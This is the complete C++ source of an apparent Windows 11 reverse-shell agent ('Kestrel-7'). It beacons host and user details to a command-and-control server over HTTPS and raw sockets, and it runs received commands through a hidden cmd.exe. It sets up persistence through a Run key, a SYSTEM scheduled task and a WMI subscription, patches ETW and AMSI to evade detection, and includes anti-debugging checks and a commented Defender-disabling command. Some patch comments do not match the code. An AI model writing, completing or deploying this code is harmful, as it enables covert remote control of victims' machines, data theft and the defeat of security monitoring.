// main.cpp - Windows 11 Reverse Shell Agent
// Compile: cl.exe /EHsc /MT /O2 /GS- /DNDEBUG main.cpp crypto.cpp network.cpp evasion.cpp persistence.cpp utils.cpp /link ws2_32.lib winhttp.lib advapi32.lib
// Target: x64 Windows 11 23H2+

#include <windows.h>
#include <winhttp.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <thread>
#include <vector>
#include <string>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")

// ---------- CONFIGURATION ----------
#define C2_HOST L"192.168.1.100"   // Change to your C2 IP
#define C2_PORT 443
#define BEACON_INTERVAL 5000       // milliseconds
#define JITTER 2000                // random delay offset
#define ENCRYPTION_KEY "Kestrel7_Win11_RevShell_2026"
#define MUTEX_NAME L"Global\\{7B8A3F1E-9C2D-4E5F-8A1B-3C4D5E6F7A8B}"

// ---------- FUNCTION PROTOTYPES ----------
extern "C" {
    void InitializeNetworking();
    void EstablishPersistence();
    void PatchETW();
    void BypassAMSI();
    void ExecuteCommand(const char* cmd, char* output, int* outLen);
    void SendBeacon(const char* data, int len);
    void ReceiveCommands();
    void SleepWithJitter(int base, int jitter);
    void EncryptPayload(unsigned char* data, int len, unsigned char* key, int keyLen);
    void DecryptPayload(unsigned char* data, int len, unsigned char* key, int keyLen);
}

// ---------- GLOBALS ----------
static HINTERNET hSession = NULL;
static HINTERNET hConnect = NULL;
static HINTERNET hRequest = NULL;
static HANDLE hMutex = NULL;
static char beaconId[64];

// ---------- MUTEX CHECK (Single Instance) ----------
BOOL IsAlreadyRunning() {
    hMutex = CreateMutexW(NULL, FALSE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return TRUE;
    }
    return FALSE;
}

// ---------- SYSTEM INFORMATION GATHERING ----------
void GatherSystemInfo(char* buffer, int bufLen) {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    DWORD version = GetVersion();
    DWORD major = (DWORD)(LOBYTE(LOWORD(version)));
    DWORD minor = (DWORD)(HIBYTE(LOWORD(version)));
    DWORD build = (DWORD)(HIWORD(version));
    
    char hostname[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    
    char username[256];
    size = sizeof(username);
    GetUserNameA(username, &size);
    
    sprintf_s(buffer, bufLen, 
        "{\"beacon\":\"%s\",\"hostname\":\"%s\",\"user\":\"%s\",\"os\":\"Windows %d.%d.%d\",\"arch\":\"%s\",\"pid\":%d}",
        beaconId, hostname, username, major, minor, build,
        sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86",
        GetCurrentProcessId());
}

// ---------- C2 COMMUNICATION (WinHTTP) ----------
void SendBeacon(const char* data, int len) {
    if (!hSession) {
        hSession = WinHttpOpen(L"Kestrel-7 Agent/2.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
        if (!hSession) return;
        hConnect = WinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
        if (!hConnect) return;
    }
    
    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/beacon", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) return;
    
    // Set headers
    LPCWSTR headers = L"Content-Type: application/octet-stream\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n";
    WinHttpSendRequest(hRequest, headers, wcslen(headers), (LPVOID)data, len, len, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    
    // Check for commands
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusSize, NULL);
    
    if (statusCode == 200) {
        // Read response (encrypted commands)
        DWORD bytesRead = 0;
        char response[4096];
        if (WinHttpReadData(hRequest, response, sizeof(response) - 1, &bytesRead)) {
            if (bytesRead > 0) {
                response[bytesRead] = 0;
                // Decrypt and process commands
                unsigned char key[32];
                memcpy(key, ENCRYPTION_KEY, 32);
                DecryptPayload((unsigned char*)response, bytesRead, key, 32);
                ExecuteCommand(response, NULL, NULL);
            }
        }
    }
    
    WinHttpCloseHandle(hRequest);
    hRequest = NULL;
}

// ---------- FALLBACK RAW SOCKET ----------
void SendSocketBeacon(const char* data, int len) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return;
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    InetPtonA(AF_INET, "192.168.1.100", &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        send(sock, data, len, 0);
        char buffer[4096];
        int recvLen = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (recvLen > 0) {
            buffer[recvLen] = 0;
            ExecuteCommand(buffer, NULL, NULL);
        }
        closesocket(sock);
    }
    WSACleanup();
}

// ---------- COMMAND EXECUTION (Hidden CMD) ----------
void ExecuteCommand(const char* cmd, char* output, int* outLen) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    HANDLE hReadPipe, hWritePipe;
    CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
    
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(STARTUPINFOA);
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    
    char cmdLine[1024];
    sprintf_s(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", cmd);
    
    if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        DWORD bytesRead = 0;
        char buffer[8192];
        if (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buffer[bytesRead] = 0;
            if (output) {
                memcpy(output, buffer, bytesRead);
                *outLen = bytesRead;
            }
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(hReadPipe);
    CloseHandle(hWritePipe);
}

// ---------- PERSISTENCE (WMI + Registry + Task) ----------
void EstablishPersistence() {
    // Method 1: Registry Run Key
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        RegSetValueExA(hKey, "Kestrel7Update", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
    
    // Method 2: Scheduled Task (via schtasks)
    char cmd[512];
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    sprintf_s(cmd, sizeof(cmd), "schtasks /create /tn \"Kestrel7Update\" /tr \"%s\" /sc onlogon /f /ru SYSTEM", path);
    WinExec(cmd, SW_HIDE);
    
    // Method 3: WMI Event Subscription (most persistent)
    const char* wmiScript = 
        "wmic /namespace:\\\\root\\subscription path __EventFilter create Name=\"Kestrel7Filter\", EventNameSpace='root\\cimv2', QueryLanguage=\"WQL\", Query=\"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'\"";
    WinExec(wmiScript, SW_HIDE);
}

// ---------- EVASION: ETW PATCH ----------
void PatchETW() {
    // Patch EtwEventWrite at runtime (x64)
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    
    FARPROC etwFunc = GetProcAddress(ntdll, "EtwEventWrite");
    if (!etwFunc) return;
    
    DWORD oldProtect;
    VirtualProtect(etwFunc, 5, PAGE_READWRITE, &oldProtect);
    
    // mov eax, 0xC0000000; ret (STATUS_SUCCESS)
    BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
    memcpy(etwFunc, patch, sizeof(patch));
    
    VirtualProtect(etwFunc, 5, oldProtect, &oldProtect);
}

// ---------- EVASION: AMSI BYPASS ----------
void BypassAMSI() {
    HMODULE amsi = GetModuleHandleA("amsi.dll");
    if (!amsi) return;
    
    FARPROC amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsiScanBuffer) return;
    
    DWORD oldProtect;
    VirtualProtect(amsiScanBuffer, 5, PAGE_READWRITE, &oldProtect);
    
    // mov eax, 0; ret (always return AMSI_RESULT_CLEAN)
    BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
    memcpy(amsiScanBuffer, patch, sizeof(patch));
    
    VirtualProtect(amsiScanBuffer, 5, oldProtect, &oldProtect);
}

// ---------- MAIN BEACON LOOP ----------
DWORD WINAPI BeaconThread(LPVOID lpParam) {
    // Generate beacon ID (based on MAC + PID)
    char id[64];
    DWORD pid = GetCurrentProcessId();
    sprintf_s(id, sizeof(id), "WIN11-%d-%x", pid, time(NULL));
    strcpy_s(beaconId, sizeof(beaconId), id);
    
    while (TRUE) {
        char beacon[4096];
        GatherSystemInfo(beacon, sizeof(beacon));
        
        // Encrypt beacon
        unsigned char key[32];
        memcpy(key, ENCRYPTION_KEY, 32);
        EncryptPayload((unsigned char*)beacon, strlen(beacon), key, 32);
        
        // Send via WinHTTP (primary)
        SendBeacon(beacon, strlen(beacon));
        
        // Fallback via raw socket if WinHTTP fails
        Sleep(1000);
        SendSocketBeacon(beacon, strlen(beacon));
        
        SleepWithJitter(BEACON_INTERVAL, JITTER);
    }
    return 0;
}

// ---------- ENTRY POINT ----------
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Anti-debug: Check for debugger
    if (IsDebuggerPresent()) {
        ExitProcess(0);
    }
    
    // Check for VMware/VirtualBox (optional evasion)
    // (simplified - check for VM artifacts)
    if (GetModuleHandleA("vmtoolsd.dll") || GetModuleHandleA("VBoxHook.dll")) {
        // Don't execute in VM (for analysis evasion)
        // ExitProcess(0); // Uncomment for stealth
    }
    
    // Single instance
    if (IsAlreadyRunning()) {
        ExitProcess(0);
    }
    
    // Disable Windows Defender real-time (if possible - requires admin)
    // WinExec("powershell -c Set-MpPreference -DisableRealtimeMonitoring $true", SW_HIDE);
    
    // Patch ETW and AMSI
    PatchETW();
    BypassAMSI();
    
    // Establish persistence (only on first run)
    if (strstr(lpCmdLine, "--install") || strstr(lpCmdLine, "-i")) {
        EstablishPersistence();
    }
    
    // Start beacon thread
    HANDLE hThread = CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    
    // Fallback to direct execution if threading fails
    while (TRUE) {
        char beacon[4096];
        GatherSystemInfo(beacon, sizeof(beacon));
        SendSocketBeacon(beacon, strlen(beacon));
        SleepWithJitter(BEACON_INTERVAL, JITTER);
    }
    
    return 0;
}
